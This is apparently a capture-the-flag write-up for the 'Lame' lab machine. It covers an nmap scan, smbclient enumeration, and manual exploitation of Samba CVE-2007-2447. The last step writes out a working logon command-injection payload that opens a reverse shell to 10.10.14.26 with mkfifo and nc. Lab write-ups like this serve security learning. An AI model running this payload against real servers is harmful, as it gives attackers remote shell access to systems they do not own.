* solution:
  1. nmap
  #+begin_src sh
nmap -sC -sV -oA Lame.nmap <ip>
    ## find smb service with version
  #+end_src
  #+NAME: nmap result
  [[./nmap.png]]
  2. (since ftp backdoor does not work), search <smb 3.0.20>
      + CVE-2007-2447 (msfconsole will give this result)

* problems:
  1. had to use smb version NT1 to connect server. 
  
* CVE-2007-2447 manual script:
   + config smbclient to use NT1
   + enumerate the smb directory, find where anonymous login is possible:
   #+begin_src sh
smbclient -L //ip
   #+end_src
   
   + anonymous login to /tmp
   #+begin_src sh
smbclient //ip/tmp
   #+end_src

   + use the logon script:
   #+begin_src sh
logon "/=`nohup rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.26 4444 >/tmp/g;rm /tmp/g`" ""
     ## logon “/= `<payload>`”
     ## based on CVE-2007-2447, the logon script did not censor user input properly, as a result, the script enclosed within the backtips is executed.
     ## vuln at source/smbd/map_username.c

   #+end_src
